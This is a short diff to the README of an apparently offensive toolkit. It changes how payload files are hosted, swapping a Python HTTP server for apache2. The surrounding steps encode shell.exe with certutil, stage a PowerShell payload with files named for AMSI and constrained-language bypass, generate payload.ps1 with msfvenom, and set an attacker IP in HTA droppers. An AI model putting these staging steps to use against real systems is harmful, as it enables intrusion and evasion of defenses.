@@ -65,7 +65,8 @@ certutil -encode shell.exe clm.txt
 
 **3. Host `clm.txt`, `amsi.txt`, and `run.txt` (your PowerShell payload) on your HTTP server:**
 ```bash
-python3 -m http.server 80
+sudo systemctl start apache2
+sudo cp clm.txt amsi.txt run.txt /var/www/html/
 ```
 
 **4. Update the attacker IP in `black.hta`:**
@@ -96,7 +97,8 @@ msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f ps1 -o /tmp/payload.ps1
 
 **2. Host `payload.ps1` on your HTTP server:**
 ```bash
-python3 -m http.server 80
+sudo systemctl start apache2
+sudo cp payload.ps1 /var/www/html/
 ```
 
 **3. Update the attacker IP in `red.hta`:**
